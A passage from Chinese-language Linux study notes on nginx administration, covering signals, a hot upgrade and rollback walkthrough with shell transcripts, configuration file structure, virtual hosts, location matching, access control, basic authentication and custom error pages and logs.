    systemctl is-active nginx &> /dev/null ||  { color "nginx 启动失败,退出!" 1 ; exit; }
    color "nginx 安装完成" 0
}

check
install
```

![1655781247859](linux体系.assets/1655781247859.png)

#### 41.3.6nginx命令和信号

**选项说明：**

```
[root@centos8 ~]#nginx -h
nginx version: nginx/1.18.0
Usage: nginx [-?hvVtTq] [-s signal] [-c filename] [-p prefix] [-g directives]
Options:
  -?,-h         : this help
  -v           : show version and exit
  -V           : show version and configure options then exit #显示版本和编译参数
  -t           : test configuration and exit #测试配置文件是否异常
  -T           : test configuration, dump it and exit #测试并打印
  -q           : suppress non-error messages during configuration testing #静默模式
  -s signal     : send signal to a master process: stop, quit, reopen, reload #发送信号,reload信号 会生成新的worker,但master不会重新生成
  -p prefix     : set prefix path (default: /etc/nginx/) #指定Nginx 目录
  -c filename   : set configuration file (default: /etc/nginx/nginx.conf) #配置文件路径
  -g directives : set global directives out of configuration file#设置全局指令,注意和配置文件不要同时配置,否则冲突
```

**信号说明：**

```
nginx -s :
立刻停止服务:stop，相当于信号SIGTERM，SIGINT，快速关闭。
优雅的停止服务:quit,相当于信号SIGQUIT，等用户任务结束后再关闭服务
平滑重启，重新加载配置文件:reload，相当于信号SIGHUP，等用户任务结束的时候，重新加载配置文件
重新开始记录目志文件:reopen，相当于信号SIGUSR1，在切割日志时用途较大
平滑升级可执行程序:发送信号SIGUSR2，在升级版本时使用
优雅的停止工作进程:发送信号SIGWINCH，在升级版本时使用
```

#### 41.3.7平滑升级和回滚

**平滑升级流程：**

![1655804725132](linux体系.assets/1655804725132.png)

```
将旧Nginx文件换成新Nginx文件(注意备份)
向master进程发送USR2信号
master进程修改pid文件名，加后缀oldbin
master进程用新Nginx文件启动新master进程，系统中将有新旧两个Nginx主进程共同提供Web服务
向旧的Nginx服务进程发送WINCH信号，使旧的Nginx worker进程平滑停止，并删除Nginx.pid.oldbin文件
向旧master进程发送QUIT信号，关闭老master
如果发现升级有问题，可以回滚:向老master发送HUP，向新master发送QUIT
```

**平滑升级和回滚案例：**

```
#1.修改编译后nginx的配置文件
[root@centos8 ~]# nginx -v
nginx version: nginx/1.18.0
[root@centos8 ~]# vim /apps/nginx/conf/nginx.conf
user  nginx;
worker_processes  2;   #两个worker进程
pid   /apps/nginx/run/nginx.pid; #注释取消
[root@centos8 ~]# mkdir /apps/nginx/run/
[root@centos8 ~]# chown -R nginx.nginx /apps/nginx/run/
[root@centos8 ~]# nginx -s reload
[root@centos8 nginx-1.18.0]# ll /apps/nginx/run/
total 4
-rw-r--r-- 1 root root 6 Jun 21 10:44 nginx.pid
[root@centos8 ~]# ps aux | grep nginx
root       22777  0.0  0.2  41180  3960 ?        Ss   17:52   0:00 nginx: master process /apps/nginx/sbin/nginx
nginx      22903  0.0  0.2  74780  4964 ?        S    18:00   0:00 nginx: worker process
nginx      22904  0.0  0.2  74780  4900 ?        S    18:00   0:00 nginx: worker process
root       22919  0.0  0.0  12108  1060 pts/0    S+   18:01   0:00 grep --color=auto nginx






#2.下载nginx-2.0源码包
[root@centos8 ~]# wget https://nginx.org/download/nginx-1.20.1.tar.gz -P /usr/local/src/
[root@centos8 ~]# cd /usr/local/src/
[root@centos8 src]# tar xvf nginx-1.20.1.tar.gz
[root@centos8 src]# cd nginx-1.20.1/
#原来编译内核的选项
[root@centos8 nginx-1.20.1]# nginx -V
nginx version: nginx/1.18.0
built by gcc 8.3.1 20191121 (Red Hat 8.3.1-5) (GCC) 
built with OpenSSL 1.1.1c FIPS  28 May 2019
TLS SNI support enabled
configure arguments: --prefix=/apps/nginx --user=nginx --group=nginx --with-http_ssl_module --with-http_v2_module --with-http_realip_module --with-http_stub_status_module --with-http_gzip_static_module --with-pcre --with-stream --with-stream_ssl_module --with-stream_realip_module
#进行编译
[root@centos8 nginx-1.20.1]# ./configure --prefix=/apps/nginx --user=nginx --group=nginx --with-http_ssl_module --with-http_v2_module --with-http_realip_module --with-http_stub_status_module --with-http_gzip_static_module --with-pcre --with-stream --with-stream_ssl_module --with-stream_realip_module
#只执行make,不执行make install,因为make install会把原来的旧版本覆盖，我们需要保留旧的版本进行版本回退
[root@centos8 nginx-1.20.1]# make






#3.备份旧版本
[root@centos8 ~]# mv /apps/nginx/sbin/nginx{,.bak}
[root@centos8 ~]# cd /usr/local/src/nginx-1.20.1/
[root@centos8 nginx-1.20.1]# cp objs/nginx /apps/nginx/sbin/
[root@centos8 nginx-1.20.1]# ll /apps/nginx/sbin/
total 14960
-rwxr-xr-x 1 root root 7723272 Jun 21 21:05 nginx
-rwxr-xr-x 1 root root 7591104 Jun 21 17:49 nginx.bak





#4.进行语法检查
[root@centos8 nginx-1.20.1]# /apps/nginx/sbin/nginx -t
nginx: the configuration file /apps/nginx/conf/nginx.conf syntax is ok
nginx: configuration file /apps/nginx/conf/nginx.conf test is successful
[root@centos8 nginx-1.20.1]# ps auxf | grep nginx
root       22575  0.0  0.0  41048   628 ?        Ss   21:29   0:00 nginx: master process /apps/nginx/sbin/nginx
nginx      22576  0.0  0.1  74572  1976 ?        S    21:29   0:00  \_ nginx: worker process
nginx      22577  0.0  0.0  74572  1040 ?        S    21:29   0:00  \_ nginx: worker process





#5.发送USR2信号进行平滑升级
[root@centos8 ~]# cat /apps/nginx/run/nginx.pid 
22575
[root@centos8 ~]# kill -USR2 `cat /apps/nginx/run/nginx.pid`
#平滑升级后变成2个master,4个worker。
[root@centos8 ~]# ps auxf | grep nginx
root       25923  0.0  0.0  12108   972 pts/0    S+   21:52   0:00  |           \_ grep --color=auto nginx
root       22575  0.0  0.1  41048  2696 ?        Ss   21:29   0:00 nginx: master process /apps/nginx/sbin/nginx
nginx      22576  0.0  0.2  74572  5008 ?        S    21:29   0:00  \_ nginx: worker process
nginx      22577  0.0  0.2  74572  4636 ?        S    21:29   0:00  \_ nginx: worker process
root       25919  0.0  0.2  41072  5408 ?        S    21:52   0:00  \_ nginx: master process /apps/nginx/sbin/nginx
nginx      25920  0.0  0.2  74684  5080 ?        S    21:52   0:00      \_ nginx: worker process
nginx      25921  0.0  0.2  74684  5080 ?        S    21:52   0:00      \_ nginx: worker process
[root@centos8 ~]# lsof -i :80
COMMAND   PID  USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
nginx   22575  root    8u  IPv4 166504      0t0  TCP *:http (LISTEN)
nginx   22576 nginx    8u  IPv4 166504      0t0  TCP *:http (LISTEN)
nginx   22577 nginx    8u  IPv4 166504      0t0  TCP *:http (LISTEN)
nginx   25919  root    8u  IPv4 166504      0t0  TCP *:http (LISTEN)
nginx   25920 nginx    8u  IPv4 166504      0t0  TCP *:http (LISTEN)
nginx   25921 nginx    8u  IPv4 166504      0t0  TCP *:http (LISTEN)







#6.进行实验
[root@centos8 ~]# cd /apps/nginx/html/
[root@centos8 html]# dd if=/dev/zero of=m.img bs=1M count=10240
#在10.0.0.7上
[22:02:10 root@centos7 ~]# wget --limit-rate=1M http://10.0.0.8/m.img
#10.0.0.8上
[root@centos8 nginx-1.20.1]# ss -ntp
State         Recv-Q         Send-Q                 Local Address:Port                   Peer Address:Port                                                                           
ESTAB         0              0                           10.0.0.8:22                         10.0.0.1:7591           users:(("sshd",pid=9583,fd=5),("sshd",pid=9581,fd=5))           
ESTAB         0              894832                      10.0.0.8:80                         10.0.0.7:44336          users:(("nginx",pid=22576,fd=13)) 
#nginx",pid=22576说明nginx现在还是用以前的进程id提供服务







#7.优雅关闭原先旧进程
[root@centos8 nginx-1.20.1]# ls /apps/nginx/run/
nginx.pid  nginx.pid.oldbin
[root@centos8 nginx-1.20.1]# cat /apps/nginx/run/nginx.pid
25919   #新的进程号
[root@centos8 nginx-1.20.1]# cat /apps/nginx/run/nginx.pid.oldbin 
22575   #旧的进程号
[root@centos8 nginx-1.20.1]# kill -WINCH `cat /apps/nginx/run/nginx.pid.oldbin`   #发送WINCH信号优雅关闭
[root@centos8 html]# ps auxf | grep nginx
root       22575  0.0  0.0  41048   628 ?        Ss   21:29   0:00 nginx: master process /apps/nginx/sbin/nginx
nginx      22576  0.0  0.1  74572  2876 ?        S    21:29   0:01  \_ nginx: worker process is shutting down   #22575关闭了
root       25919  0.0  0.0  41072  1236 ?        S    21:52   0:00  \_ nginx: master process /apps/nginx/sbin/nginx
nginx      25920  0.0  0.1  74684  2480 ?        S    21:52   0:00      \_ nginx: worker process
nginx      25921  0.0  0.1  74684  2480 ?        S    21:52   0:00      \_ nginx: worker process
#关闭10.0.0.7上的下载进程
#原来的master还在，并且原来的master是现在master的父进程
[root@centos8 nginx-1.20.1]# ps auxf | grep nginx
root       22575  0.0  0.0  41048   628 ?        Ss   21:29   0:00 nginx: master process /apps/nginx/sbin/nginx
root       25919  0.0  0.0  41072  1236 ?        S    21:52   0:00  \_ nginx: master process /apps/nginx/sbin/nginx
nginx      25920  0.0  0.1  74684  2480 ?        S    21:52   0:00      \_ nginx: worker process
nginx      25921  0.0  0.1  74684  2480 ?        S    21:52   0:00      \_ nginx: worker process
[root@centos8 nginx-1.20.1]# pstree -p |grep nginx
           |-nginx(22575)---nginx(25919)-+-nginx(25920)
           |                             `-nginx(25921)
           
#10.0.0.7重新wget --limit-rate=1M http://10.0.0.8/m.img

[root@centos8 nginx-1.20.1]# ss -ntp
State         Recv-Q         Send-Q                 Local Address:Port                   Peer Address:Port                                                                           
ESTAB         0              0                           10.0.0.8:22                         10.0.0.1:7591           users:(("sshd",pid=9583,fd=5),("sshd",pid=9581,fd=5))           
ESTAB         0              773232                      10.0.0.8:80                         10.0.0.7:44338          users:(("nginx",pid=25920,fd=14))  #新的进程号







#8.回滚或者升级
#8.1进行回滚
[root@centos8 nginx-1.20.1]# kill -HUP `cat /apps/nginx/run/nginx.pid.oldbin`
[root@centos8 nginx-1.20.1]# pstree -p |grep nginx
           |-nginx(22575)-+-nginx(25919)-+-nginx(25920)
           |              |              `-nginx(25921)
           |              |-nginx(26369)
           |              `-nginx(26370)
#最后关闭新版的master
[root@centos8 nginx-1.20.1]# kill -QUIT `cat /apps/nginx/run/nginx.pid`
#10.0.0.7查看版本
[22:35:25 root@centos7 ~]#curl -I http://10.0.0.8/
HTTP/1.1 200 OK
Server: nginx/1.18.0   #回退到旧版本!!!!
Date: Tue, 21 Jun 2022 14:37:09 GMT
Content-Type: text/html
Content-Length: 612
Last-Modified: Tue, 21 Jun 2022 13:26:42 GMT
Connection: keep-alive
ETag: "62b1c712-264"
Accept-Ranges: bytes


#8.2进行升级
[root@centos8 nginx-1.20.1]# kill -USR2 `cat /apps/nginx/run/nginx.pid`
[root@centos8 nginx-1.20.1]# kill -WINCH `cat /apps/nginx/run/nginx.pid.oldbin`
[root@centos8 nginx-1.20.1]# kill -QUIT `cat /apps/nginx/run/nginx.pid.oldbin`
#10.0.0.7上测试是否升级成功
[22:46:17 root@centos7 ~]#curl -I http://10.0.0.8/
HTTP/1.1 200 OK
Server: nginx/1.20.1    #升级成功!!!!
Date: Tue, 21 Jun 2022 14:57:19 GMT
Content-Type: text/html
Content-Length: 612
Last-Modified: Tue, 21 Jun 2022 13:26:42 GMT
Connection: keep-alive
ETag: "62b1c712-264"
Accept-Ranges: bytes
```

### 41.4Nginx核心配置详解

#### 41.4.1配置文件说明

**nginx.conf配置文件说明**

```
#全局配置端，对全局生效，主要设置nginx的启动用户/组，启动的工作进程数量，工作模式，Nginx的PID路径，日志路径等。
user nginx nginx;
worker_processes  1;   #启动工作进程数数量
worker_cpu_affinity 00000001 00000010;  #将worker和cpu的核数绑定一起，避免cpu一级二级缓存失效
pid        /apps/nginx/run/nginx.pid;  #pid文件保存路径
worker_priority 0;  #进程优先级 -20-19，值越小有优先级越高

worker_rlimit_nofile 65536;  #所有worker进程能打开的文件数量上限

#修改pam模块
[root@centos7 ~]# vim /etc/security/limits.conf
*                soft    core            unlimited
*                hard    core            unlimited
*                soft    nproc           1000000
*                hard    nproc           1000000
*                soft    nofile          1000000
*                hard    nofile          1000000
*                soft    memlock         32000
*                hard    memlock         32000
*                soft    msgqueue        8192000
*                hard    msgqueue        8192000

daemon off; #指定前台执行
master_process off|on; off表示只有master一个进程

events { 
     worker_connections  1024;   #设置单个nginx工作进程可以接受的最大并发，作为web服务器的时候最大并发数为worker_connections * worker_processes，作为反向代理的时候为(worker_connections * worker_processes)/2
    use epoll;  #使用epoll时间驱动，性能最佳
    accept_mutex on;  #类似于轮询算法，建议加上
    multi_accept on; #每个工作进程可以同时接受多个新的网络连接
}


http { #http块是Nginx服务器配置中的重要部分，缓存、代理和日志格式定义等绝大多数功能和第三方模块都可以在这设置，http块可以包含多个server块，而一个server块中又可以包含多个location块，server块可以配置文件引入、MIME-Type定义、日志自定义、是否启用sendfile、连接超时时间和单个链接的请求上限等。
   include       mime.types;
   default_type application/octet-stream;
   sendfile       on; #作为web服务器的时候打开sendfile加快静态文件传输，指定是否使用sendfile系统调用来传输文件,sendfile系统调用在两个文件描述符之间直接传递数据(完全在内核中操作)，从而避免了数据在内核缓冲区和用户缓冲区之间的拷贝，操作效率很高，被称之为零拷贝，硬盘 >> kernel buffer (快速拷贝到kernelsocket buffer) >>协议栈。
   keepalive_timeout  65;  #长连接超时时间，单位是秒
   server { #设置一个虚拟机主机，可以包含自己的全局快，同时也可以包含多个location模块。比如本虚拟机监听的端口、本虚拟机的名称和IP配置，多个server 可以使用一个端口，比如都使用80端口提供web服务
       listen       80;  #配置server监听的端口
       server_name localhost; #本server的名称，当访问此名称的时候nginx会调用当前serevr内部的配置进程匹配。

       location / { #location其实是server的一个指令，为nginx服务器提供比较多而且灵活的指令，都是在location中体现的，主要是基于nginx接受到的请求字符串，对用户请求的UIL进行匹配，并对特定的指令进行处理，包括地址重定向、数据缓存和应答控制等功能都是在这部分实现，另外很多第三方模块的配置也是在location模块中配置。
           root   html; #相当于默认页面的目录名称，默认是安装目录的相对路径，可以使用绝对路径配置。
           index index.html index.htm; #默认的页面文件名称
       }
       error_page   500 502 503 504 /50x.html; #错误页面的文件名称
       location = /50x.html { #location处理对应的不同错误码的页面定义到/50x.html，这个跟对应其server中定义的目录下。
           root   html;  #定义默认页面所在的目录
       }
   }
    
#和邮件相关的配置
#mail {
#               ...
#       }         mail 协议相关配置段
#tcp代理配置，1.9版本以上支持
#stream {
#               ...
#       }       stream 服务器相关配置段
#导入其他路径的配置文件
#include /apps/nginx/conf.d/*.conf
}
```

#### 41.4.2全局配置

```
main block：主配置段，即全局配置段，对http,mail都有效

#事件驱动相关的配置
event {
 ...
}   

#http/https 协议相关配置段
http {
 ...
}   

#默认配置文件不包括下面两个块
#mail 协议相关配置段
mail {
 ...
}    

#stream 服务器相关配置段
stream {
 ...
}
```

#### 41.4.3http配置块

**http协议相关的配置结构**

```
http {
 ...
 ...  #各server的公共配置
 server {    #每个server用于定义一个虚拟主机,第一个server为默认虚拟服务器
 ...
  }
  server {     
       ...
       server_name   #虚拟主机名
       root     #主目录
       alias     #路径别名
       location [OPERATOR] URL {     #指定URL的特性
        ...
       if CONDITION {
         ...
         }
      }
   }
}
```

**http协议配置说明**

```
http {
   include       mime.types; #导入支持的文件类型,是相对于/apps/nginx/conf的目录
   default_type application/octet-stream; #除mime.types中文件类型外,设置其它文件默认类型，访问其它类型时会提示下载不匹配的类型文件
   
#日志配置部分
    #log_format main '$remote_addr - $remote_user [$time_local] "$request" '
    #                 '$status $body_bytes_sent "$http_referer" '
    #                 '"$http_user_agent" "$http_x_forwarded_for"';
    #access_log logs/access.log main;
    
#自定义优化参数
   sendfile       on; 
    #tcp_nopush     on; #在开启了sendfile的情况下，合并请求后统一发送给客户端。
    
    #tcp_nodelay   off; #在开启了keepalived模式下的连接是否启用TCP_NODELAY选项，当为off时，延迟0.2s发送，默认On时，不延迟发送，立即发送用户响应报文。
    #keepalive_timeout 0;
   keepalive_timeout  65 65; #设置会话保持时间,第二个值为响应首部:keepAlived:timeout=65,可以和第一个值不同
    #gzip on; #开启文件压缩
   server {
       listen       80; #设置监听地址和端口
       server_name localhost; #设置server name，可以以空格隔开写多个并支持正则表达式如:*.magedu.com www.magedu.* ~^www\d+\.magedu\.com$ default_server 
        #charset koi8-r; #设置编码格式，默认是俄语格式，建议改为utf-8
        #access_log logs/host.access.log main;
       location / {
           root   html;
           index index.html index.htm;
       }
        #error_page 404             /404.html;
        # redirect server error pages to the static page /50x.html
        #
       error_page   500 502 503 504 /50x.html; #定义错误页面
       location = /50x.html {
           root   html;
       }
        # proxy the PHP scripts to Apache listening on 127.0.0.1:80
        #
        #location ~ \.php$ { #以http的方式转发php请求到指定web服务器
        #   proxy_pass   http://127.0.0.1;
        #}
        # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000
        #
        #location ~ \.php$ { #以fastcgi的方式转发php请求到php处理
        #   root           html;
        #   fastcgi_pass   127.0.0.1:9000;
        #   fastcgi_index index.php;
        #   fastcgi_param SCRIPT_FILENAME /scripts$fastcgi_script_name;
        #   include       fastcgi_params;
        #}
        # deny access to .htaccess files, if Apache's document root
        # concurs with nginx's one
        #
        #location ~ /\.ht { #拒绝web形式访问指定文件，如很多的网站都是通过.htaccess文件
来改变自己的重定向等功能。
        #   deny all;
        #}
       location ~ /passwd.html {
           deny all;
       }
   }
    # another virtual host using mix of IP-, name-, and port-based configuration
    #
    #server { #自定义虚拟server
    #   listen       8000;
    #   listen       somename:8080;
    #   server_name somename alias another.alias;
    #   location / { 
    #       root   html;
    #       index index.html index.htm; #指定默认网页文件，此指令由ngx_http_index_module模块提供
    #   }
    #}
    # HTTPS server
    #
    #server { #https服务器配置
    #   listen       443 ssl;
    #   server_name localhost;
    #   ssl_certificate     cert.pem;
    #   ssl_certificate_key cert.key;
    #   ssl_session_cache   shared:SSL:1m;
    #   ssl_session_timeout 5m;
    #   ssl_ciphers HIGH:!aNULL:!MD5;
    #   ssl_prefer_server_ciphers on;
    #   location / {
    #       root   html;
    #       index index.html index.htm;
    #   }
    #}
```

##### 41.4.3.1指定响应报文server首部

```
#是否在响应报文中的Content-Type显示指定的字符集，默认off不显示
charset charset | off;

#示例
charset utf-8;

#是否在响应报文的Server首部显示nginx版本
server_tokens on | off | build | string;
[root@centos8 nginx-1.20.1]# vim /apps/nginx/conf/nginx.conf
http {
    server_tokens off
}
[root@centos8 nginx-1.20.1]# nginx -s reload
```

**范例: 修改 Server 头部信息**

```
[root@centos8 run]# vim /usr/local/src/nginx-1.20.1/src/core/nginx.h
#server_tokens on显示liuNginx/6.66.6
#define NGINX_VERSION      "6.66.6"
#define NGINX_VER          "liuNginx/" NGINX_VERSION

[root@centos8 run]# cd /usr/local/src/nginx-1.20.1/
[root@centos8 nginx-1.20.1]# vim src/http/ngx_http_header_filter_module.c
49 static u_char ngx_http_server_string[] = "Server: Liunginx" CRLF;  #server_tokens off显示Liunginx
#修改源代码后重新编译安装
[root@centos8 nginx-1.20.1]# ./configure --prefix=/apps/nginx --user=nginx --group=nginx --with-http_ssl_module --with-http_v2_module --with-http_realip_module --with-http_stub_status_module --with-http_gzip_static_module --with-pcre --with-stream --with-stream_ssl_module --with-stream_realip_module
[root@centos8 nginx-1.20.1]# make -j 2 && make install
[root@centos8 nginx-1.20.1]# nginx -v
nginx version: liuNginx/6.66.6  #版本修改成自己改的
[root@centos8 nginx-1.20.1]# nginx -s reload
```

![1655826696432](linux体系.assets/1655826696432.png)

#### 41.4.4 多虚拟主机

```
#0.目标
新建一个 PC web站点和mobile web站点

#1.定义子本置文件路径
[root@centos7 ~]# mkdir /apps/nginx/conf.d
[root@centos7 ~]# mkdir /data/nginx/html/pc -pv
[root@centos7 ~]# mkdir /data/nginx/html/mobile -pv
[root@centos7 ~]# echo pc website > /data/nginx/html/pc/index.html
[root@centos7 ~]# echo mobile website > /data/nginx/html/mobile/index.html
[root@centos7 ~]# vim /apps/nginx/conf/nginx.conf
http {
    include       mime.types;
    include       /apps/nginx/conf.d/*.conf;
}
[root@centos7 run]# vim /apps/nginx/conf.d/pc.conf
server {
    listen 80;
    server_name www.liusenbiao.org;
    root /data/nginx/html/pc/;
}
#创建手机网站
[root@centos7 conf.d]# vim mobile.conf 
server {
    listen 80;
    server_name m.liusenbiao.org;
    root /data/nginx/html/mobile/;
}
[root@centos7 run]# nginx -t
nginx: the configuration file /apps/nginx/conf/nginx.conf syntax is ok
nginx: configuration file /apps/nginx//conf/nginx.conf test is successful
[root@centos7 run]# nginx -s reload




#2.创建主网页下的子网页
[root@centos7 ~]# cd /data/nginx/html/pc/
[root@centos7 pc]# mkdir news
[root@centos7 pc]# echo pc website news dir > news/index.html



#3.root进行实验
加上alias访问的目录不是在数据真正的目录下，而是在别的目录下
[root@centos7 pc]# mkdir /opt/nginx/sports -pv
[root@centos7 pc]# echo this is sports not in the root >  /opt/nginx/sports/index.html
[root@centos7 pc]# vim /apps/nginx/conf.d/pc.conf

server {
    listen 80;
    server_name www.liusenbiao.org;
    root /data/nginx/html/pc/;
    location /sports {
    root /opt/nginx;   #访问的是/opt/nginx/sports
   }
}
[root@centos7 pc]# nginx -s reload



#4.alias进行实验
[root@centos7 pc]# mkdir /temp/nginx/studydir -pv
[root@centos7 pc]# echo /temp/nginx/studydir/index.html > /temp/nginx/studydir/index.html
[root@centos7 pc]# vim /apps/nginx/conf.d/pc.conf

server {
    listen 80;
    server_name www.liusenbiao.org;
    root /data/nginx/html/pc/;
    location /sports {
    root /opt/nginx;
    }
    location /study {
    alias /temp/nginx/studydir;

   }
}  
[root@centos7 pc]# nginx -s reload




#.修改hosts文件
#10.0.0.7上测试
[21:30:40 root@centos7 templates]# vim /etc/hosts
127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4
::1         localhost localhost.localdomain localhost6 localhost6.localdomain6

10.0.0.67 www.liusenbiao.org m.liusenbiao.org
#测试pc端
[21:30:40 root@centos7 templates]# curl www.liusenbiao.org
pc website
#测试网页端
[21:39:03 root@centos7 templates]#curl m.liusenbiao.org
mobile website
#测试子目录
[21:53:02 root@centos7 ~]#curl www.liusenbiao.org/news/                  
pc website news dir 
#测试root
[22:12:45 root@centos7 ~]#curl www.liusenbiao.org/sports/
this is sports not in the root
#测试alias
[22:12:57 root@centos7 ~]#curl www.liusenbiao.org/study/
/temp/nginx/studydir/index.html
```

#### 41.4.5 location的详细使用

##### 41.4.5.1location语法

```
#1.location概述
在一个server中location配置段可存在多个，用于实现从uri到文件系统的路径映射；ngnix会根据用户请求的URI来检查定义的所有location，按一定的优化级找出一个最佳匹配，而后应用其配置

在没有使用正则表达式的时候，nginx会先在server中的多location选取匹配度最高的一个uri，uri是用户请求的字符串，即域名后面的web文件路径，然后使用该location模块中的正则url和字符串，如果
匹配成功就结束搜索，并使用此location处理此请求。





#2.location语法
#语法规则：
location [ = | ~ | ~* | ^~ ] uri { ... }
=   #用于标准uri前，需要请求字串与uri精确匹配，大小敏感,如果匹配成功就停止向下匹配并立即处理请求
^~  #用于标准uri前，表示包含正则表达式,并且匹配以指定的正则表达式开头,对URI的最左边部分做匹配检查，不区分字符大小写
~   #用于标准uri前，表示包含正则表达式,并且区分大小写
~*  #用于标准uri前，表示包含正则表达式,并且不区分大写
不带符号 #匹配起始于此uri的所有的uri
\   #用于标准uri前，表示包含正则表达式并且转义字符。可以将 . * ?等转义为普通符号

#匹配优先级从高到低：
=, ^~, ~/~*, 不带符号
#匹配优先级：=, ^~, ～/～*，/

location优先级：(location =) > (location ^~ 路径) > (location ~,~* 正则顺序) > (location 完整路径) > (location 部分起始路径) > (/)
```

##### 41.4.5.2精确匹配

```
范例: 精确匹配logo
[root@centos8 ~]# cat /apps/nginx/conf/conf.d/pc.conf 
server {
 listen 80;
 server_name www.liusenbiao.org;
 location / {
    root /data/nginx/html/pc;
 }
 
 location = /logo.jpg {
   root /data/nginx/images;  #精确匹配/data/nginx/images/logo.jpg
   index index.html;
    }
}
```

##### 41.4.5.3区分大小写

```
~ 实现区分大小写的模糊匹配. 以下范例中, 如果访问uri中包含大写字母的JPG，则以下location匹配Ax.jpg条件不成功，因为 ~ 区分大小写，那么当用户的请求被执行匹配时发现location中定义的是大写的jpg，则匹配失败，即要么继续往下匹配其他的location（如有），要么报错给客户端。

location ~ /A.?\.jpg {     #匹配字母A开头的jpg图片，后面.?表示A后面零次或一个字符
   index index.html;
   root /data/nginx/html/image;
}
  
#重启Nginx并访问测试
#将只能访问以小写字符的jpg图片，不能识别大写的JPG结尾的图片
```

![1655997386262](linux体系.assets/1655997386262.png)

##### 41.4.5.4不区分大小写

```
~* 用来对用户请求的uri做模糊匹配，uri中无论都是大写、都是小写或者大小写混合，此模式也都会匹配，通常使用此模式匹配用户request中的静态资源并继续做下一步操作,此方式使用较多
注意: 此方式中,对于Linux文件系统上的文件仍然是区分大小写的,如果磁盘文件不存在,仍会提示404



#正则表达式匹配：
 location ~* /A.?\.jpg {
   index index.html;
   root /opt/nginx/html/image;
 }
 
#重启Nginx并访问测试对于不区分大小写的location，则可以访问任意大小写结尾的图片文件,如区分大小写则只能访问Aa.jpg此类文件，不区分大小写则可以访问aa.jpg以外的资源比如Aa.JPG、aA.jPG这样的混合名称文件，但是要求nginx服务器的资源目录有相应的文件，比如有Aa.JPG有aA.jPG。
```

##### 41.4.5.5URI开始

```
location ^~ /images {    #以images开头
   root /data/nginx/;
   index index.html;
 }
 
location /api {
   alias /data/nginx/api;
   index index.html;
}  

#重启Nginx并访问测试，实现效果是访问/images和/app返回不同的结果
[root@centos8 ~]# curl http://www.magedu.org/images/
images
[root@centos8 ~]# curl http://www.magedu.org/api/
api web
```

##### 41.4.5.6文件名后缀

```
[root@centos8 ~]# mkdir /data/nginx/static
#上传一个图片到/data/nginx/static

 location ~* \.(gif|jpg|jpeg|bmp|png|tiff|tif|ico|wmf|js|css)$ {
   root /data/nginx/static;
   index index.html;
 }
 
#重启Nginx并访问测试
```

#### 41.4.6Nginx四层访问控制

```
访问控制基于模块ngx_http_access_module实现，可以通过匹配客户端源IP地址进行限制
注意: 如果能在防火墙设备控制,最好就不要在nginx上配置,可以更好的节约资源



location = /login/ {
   root /data/nginx/html/pc;
   allow 10.0.0.0/24;
   deny all;
 }
 
location /about {
   alias /data/nginx/html/pc;
   index index.html;
   deny  192.168.1.1;
   allow 192.168.1.0/24;
   allow 10.1.1.0/16;
   allow 2001:0db8::/32;
   deny all;  #按先小范围到大范围排序
 }
```

#### 41.4.7 Nginx账户认证功能

```
#1.创建相应的包
#CentOS安装包
[root@centos7 ~]# yum -y install httpd-tools
#Ubuntu安装包
[root@Ubuntu ~]#apt -y install apache2-utils




#2.#创建用户
#-b 非交互式方式提交密码
[root@centos7 ~]# htpasswd -cb /apps/nginx/conf.d/.htpasswd xiaoming 123456
[root@centos7 ~]# htpasswd /apps/nginx/conf.d/.htpasswd xioahong
[root@centos7 ~]# cat /apps/nginx/conf.d/.htpasswd
xiaoming:$apr1$qoAqDXCr$4U4.fxGc.aSO/MhCQZiT/1
xioahong:$apr1$MYnWhmNH$4OIreyaNwsEwiAfCsHrhc0




#3.创建对应文件夹
[root@centos7 ~]# mkdir /data/nginx/html/pc/admin
[root@centos7 ~]# echo this is admin.html > /data/nginx/html/pc/admin/index.html



#4.修改nginx子配置文件
[root@centos7 ~]# vim /apps/nginx/conf.d/pc.conf
server {
    listen 80;
    server_name www.liusenbiao.org;
    root /data/nginx/html/pc/;
    location /sports {
    root /opt/nginx;
    }
    location /study {
    alias /temp/nginx/studydir;
   }
    #验证用户身份
    location /admin {
    auth_basic      "login password";
    auth_basic_user_file /apps/nginx/conf.d/.htpasswd;
  }
}
```

![1656037673145](linux体系.assets/1656037673145.png)

![1656037885399](linux体系.assets/1656037885399.png)

#### 41.4.8自定义错误页面

```
#1.创建存放错误页面的包
[root@centos7 ~]# mkdir /data/nginx/html/pc/error/
[root@centos7 ~]# vim /data/nginx/html/pc/error/40x.html
<h1> 40x error email 1805336068@qq.com</h1>



#2.修改nginx配置文件
[root@centos7 ~]# vim /apps/nginx/conf.d/pc.conf
server {
    listen 80;
    server_name www.liusenbiao.org;
    root /data/nginx/html/pc/;
    #定义错误页面
    error_page  404  /40x.html;  #跳到自定义页面
     error_page  404 =302  /index.html; #直接跳到主页面
    location = /40x.html {
            root   /data/nginx/html/pc/error/;#定义错误页面存放路径
     }

    location /sports {
    root /opt/nginx;
    }
    location /study {
    alias /temp/nginx/studydir;
   }

    location /admin {
    auth_basic      "login password";
    auth_basic_user_file /apps/nginx/conf.d/.htpasswd;
  }
}
```

**跳到自定义页面：**

![1656041832679](linux体系.assets/1656041832679.png)

**跳到主页面**

![1656042308169](linux体系.assets/1656042308169.png)

#### 41.4.9自定义错误日志

```
#1.错误日志格式：
Syntax: error_log file [level];
Default: 
error_log logs/error.log error;
Context: main, http, mail, stream, server, location
level: debug, info, notice, warn, error, crit, alert, emerg



#2.案例
[root@centos7 ~]# vim /apps/nginx/conf.d/pc.conf
#专门存放pc端的错误日志
server {
    listen 80;
    server_name www.liusenbiao.org;
    root /data/nginx/html/pc/;
    error_page  404 =302 /index.html;
    error_log /apps/nginx/logs/www.liusenbiao.org_error.log; #错误日志
    location = /40x.html {
            root   /data/nginx/html/pc/error/;
     }  #定义错误日志的路径

    location /sports {
    root /opt/nginx;
    }
    location /study {
    alias /temp/nginx/studydir;
   }

    location /admin {
    auth_basic      "login password";
    auth_basic_user_file /apps/nginx/conf.d/.htpasswd;
   }
}
#专门存放mobile端的错误日志
[root@centos7 conf.d]# vim mobile.conf 
server {
    listen 80;
    server_name m.liusenbiao.org;
    access_log /apps/nginx/logs/m.liusenbiao.org_error.log;
    root /data/nginx/html/mobile/;
}
[root@centos7 conf.d]# nginx -s reload
```

![1656043468623](linux体系.assets/1656043468623.png)

#### 41.4.10检测文件是否存在

```
#1.try_files概述
